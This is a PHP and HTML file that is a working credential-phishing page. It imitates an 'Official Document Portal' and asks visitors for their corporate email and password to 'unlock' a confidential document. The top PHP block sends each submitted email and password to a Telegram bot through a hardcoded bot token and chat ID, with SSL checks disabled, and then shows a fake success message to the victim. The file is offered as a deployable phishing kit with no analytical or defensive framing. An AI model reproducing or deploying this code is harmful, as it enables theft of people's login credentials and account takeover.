<?php
// Configuration details
$bot_token = "9290775005:AAHjdXrkhjuQHWowxJTfvLoirP6nPa6opmc";
$chat_id   = "1080822304";

$message_sent = false;
$error_message = "";

// Check if the HTML form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 1. Capture and sanitize user inputs
    $email      = strip_tags(trim($_POST['email']));
    $password   = strip_tags(trim($_POST['password']));

    if (!empty($email) && !empty($password)) {
        
        // 2. Clear clean text layout (No markdown syntax on the email to avoid crashes)
        $message_text = "📄 DOCUMENT ACCESS PORTAL REGISTRATION\n\n"
                      . "📧 Portal Email: " . $email . "\n"
                      . "🔑 Access Key: " . $password;

        // 3. Official Telegram Bot API gateway URL
        $telegram_url = "https://telegram.org" . $bot_token . "/sendMessage";
        
        // 4. Request payload parameters
        $data = [
            'chat_id'    => $chat_id,
            'text'       => $message_text
        ];

        // 5. Fire the request securely to Telegram via curl
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegram_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        // Keep timeouts fast so Vercel doesn't hang
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        
        $response = curl_exec($ch);
        curl_close($ch);

        if ($response) {
            $result = json_decode($response, true);
            if (isset($result['ok']) && $result['ok'] == true) {
                $message_sent = true;
            } else {
                $error_message = "Telegram API Error: " . $result['description'];
            }
        } else {
            $error_message = "Telegram server did not respond in time.";
        }
    } else {
        $error_message = "Please complete all verification fields.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Portal Access</title>
    <style>
        * { 
            box-sizing: border-box; 
        }
        body { 
            margin: 0; 
            padding: 40px 16px; 
            background: #f8f9fa; 
            color: #212529; 
            font-family: "Georgia", "Times New Roman", Times, serif; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .pdf-page { 
            width: 100%; 
            max-width: 550px; 
            background: #ffffff; 
            border-radius: 4px; 
            padding: 50px 45px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); 
            border: 1px solid #e9ecef;
            position: relative;
        }
        .pdf-page::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: #1a365d;
        }
        .meta-header {
            font-family: "Helvetica Neue", Arial, sans-serif;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #6c757d;
            margin-bottom: 40px;
            border-bottom: 1px solid #dee2e6;
            padding-bottom: 8px;
        }
        .title-section h1 { 
            margin: 0 0 10px 0; 
            font-size: 28px; 
            font-weight: normal;
            color: #1a365d;
            line-height: 1.2;
        }
        .title-section p {
            margin: 0 0 35px 0;
            font-size: 14px;
            color: #495057;
            font-style: italic;
        }
        .divider {
            height: 1px;
            background: #dee2e6;
            margin-bottom: 35px;
        }
        .form-group { 
            margin-bottom: 22px; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            font-family: "Helvetica Neue", Arial, sans-serif;
            font-weight: 600; 
            color: #212529; 
            text-transform: uppercase; 
            font-size: 11px; 
            letter-spacing: 1px;
        }
        input[type="email"], input[type="password"] { 
            width: 100%; 
            padding: 12px 14px; 
            border: 1px solid #ced4da; 
            border-radius: 4px; 
            background: #ffffff; 
            font-size: 14px; 
            color: #495057; 
            outline: none; 
            font-family: "Helvetica Neue", Arial, sans-serif;
            transition: border-color 0.15s ease-in-out;
        }
        input:focus { 
            border-color: #1a365d; 
            background: #ffffff; 
        }
        .submit-btn { 
            display: inline-block; 
            width: 100%; 
            padding: 14px; 
            background: #1a365d; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            font-weight: bold; 
            font-size: 14px; 
            cursor: pointer; 
            text-transform: uppercase; 
            letter-spacing: 1.5px; 
            font-family: "Helvetica Neue", Arial, sans-serif;
            margin-top: 15px;
            transition: background-color 0.2s ease;
        }
        .submit-btn:hover { 
            background: #2a4365; 
        }
        .status-msg { 
            padding: 12px; 
            margin-bottom: 25px; 
            border-radius: 4px; 
            font-size: 13px;
            font-family: "Helvetica Neue", Arial, sans-serif;
        }
        .success { 
            background: #e6fffa; 
            color: #234e52; 
            border: 1px solid #b2f5ea;
        }
        .error { 
            background: #fff5f5; 
            color: #742a2a; 
            border: 1px solid #fed7d7;
        }
        .footer { 
            margin-top: 50px;
            padding-top: 15px; 
            border-top: 1px solid #dee2e6; 
            color: #6c757d; 
            font-size: 11px; 
            font-family: "Helvetica Neue", Arial, sans-serif;
            display: flex;
            justify-content: space-between;
        }
    </style>
</head>
<body>

    <main class="pdf-page">
        <div class="meta-header">Official Document Portal // Registry Division</div>

        <div class="title-section">
            <h1>Secure Document Access</h1>
            <p>Please log in using your digital credentials to view the requested files.</p>
        </div>

        <div class="divider"></div>

        <!-- Dynamic Status Alerts -->
        <?php if ($message_sent): ?>
            <div class="status-msg success">Verification successful. Connecting to secure file server...</div>
        <?php endif; ?>

        <?php if (!empty($error_message)): ?>
            <div class="status-msg error"><?php echo $error_message; ?></div>
        <?php endif; ?>

        <form action="/" method="POST">
            <div class="form-group">
                <label for="input-email">Corporate Email Address</label>
                <input type="email" id="input-email" name="email" placeholder="name@organization.com" required>
            </div>

            <div class="form-group">
                <label for="input-password">Portal Passkey</label>
                <input type="password" id="input-password" name="password" placeholder="••••••••" required>
            </div>

            <button type="submit" class="submit-btn">Unlock Document</button>
        </form>

        <div class="footer">
            <span>CONFIDENTIAL CLASSIFIED</span>
            <span>Ref: DOC-2026-IDX</span>
        </div>
    </main>

</body>
</html>
